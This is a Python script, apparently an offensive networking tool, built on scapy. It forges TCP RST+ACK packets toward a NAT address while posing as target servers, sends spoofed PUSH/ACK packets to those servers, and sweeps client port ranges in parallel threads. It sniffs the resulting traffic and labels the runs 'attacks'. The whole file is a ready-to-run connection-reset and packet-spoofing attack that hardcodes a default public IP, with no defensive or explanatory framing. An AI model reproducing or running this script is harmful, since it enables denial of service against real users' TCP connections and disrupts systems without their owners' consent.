#!/usr/bin/env python3

from scapy.all import *
import threading
import random
import time

iface = "wlp0s20f3"  
default_client_port_range = (32738, 65535)
default_nat_ip = "125.22.40.140"

def rand_seq():
    return random.randint(0, 0xFFFFFFFF)

def parse_ports(input_str, default_range):
    if not input_str.strip():
        return list(range(default_range[0], default_range[1], 1000))
    try:
        return [int(p.strip()) for p in input_str.split(',')]
    except ValueError:
        print("[!] Invalid port format. Using default range.")
        return list(range(default_range[0], default_range[1], 1000))

def parse_ips(input_str):
    return [ip.strip() for ip in input_str.split(',') if ip.strip()]

def packet_callback(pkt):
    if IP in pkt and TCP in pkt:
        print(f"[+] Captured Packet: {pkt.summary()}")
        pkt.show()

def attack_server(nat_ip, server_ip, server_port, port_range):
    print(f"\n[*] Thread started for {server_ip}:{server_port} using port range")

    for port in port_range:
        # Stage 1: Forged RST+ACK to client (NAT) using range as destination port
        rst_ack_pkt = IP(src=server_ip, dst=nat_ip) / \
                      TCP(sport=server_port, dport=port, flags="RA", seq=rand_seq(), ack=rand_seq())
        send(rst_ack_pkt, count=3, inter=0.1, verbose=0)
        print(f"  [>] Sent forged RST+ACK to NAT from {server_ip}:{server_port} -> {nat_ip}:{port}")

        # Stage 2: PUSH/ACK to server using range as source port
        push_ack_pkt = IP(src=nat_ip, dst=server_ip) / \
                       TCP(sport=port, dport=server_port, flags="PA", seq=rand_seq(), ack=rand_seq())
        send(push_ack_pkt, count=3, inter=0.1, verbose=0)
        print(f"  [>] Sent PUSH/ACK to Server from {nat_ip}:{port} -> {server_ip}:{server_port}")

# ======= MAIN PROGRAM =======
try:
    server_ips = parse_ips(input("Provide the list of server IPs (comma-separated): "))
    if not server_ips:
        print("[!] No server IPs provided. Exiting.")
        exit(1)

    port_range = parse_ports(input("Port range to use (comma-separated or empty for default 30k-60k): "),
                             default_client_port_range)

    server_dports = parse_ports(input("Destination ports for each server (comma-separated): "), [443, 444])
    if len(server_dports) != len(server_ips):
        print("[!] Mismatch in number of server IPs and ports. Using default port 443 for all.")
        server_dports = [443] * len(server_ips)

    nat_ip = input(f"NAT IP (public IP visible to server) [Default: {default_nat_ip}]: ").strip()
    if not nat_ip:
        nat_ip = default_nat_ip
        print(f"[*] Using default NAT IP: {nat_ip}")

except KeyboardInterrupt:
    print("\n[!] User aborted input.")
    exit(1)

# Start packet sniffer
print("[*] Starting packet sniffer...")
sniffer = AsyncSniffer(
    iface=iface,
    filter=f"tcp and (host {' or host '.join(server_ips)} or host {nat_ip})",
    prn=packet_callback,
    store=True
)
sniffer.start()
time.sleep(2)

threads = []
for idx, server_ip in enumerate(server_ips):
    server_port = server_dports[idx]
    t = threading.Thread(target=attack_server, args=(nat_ip, server_ip, server_port, port_range))
    t.start()
    threads.append(t)

for t in threads:
    t.join()

sniffer.stop()
print("\n[*] All attacks completed. Sniffing stopped.")

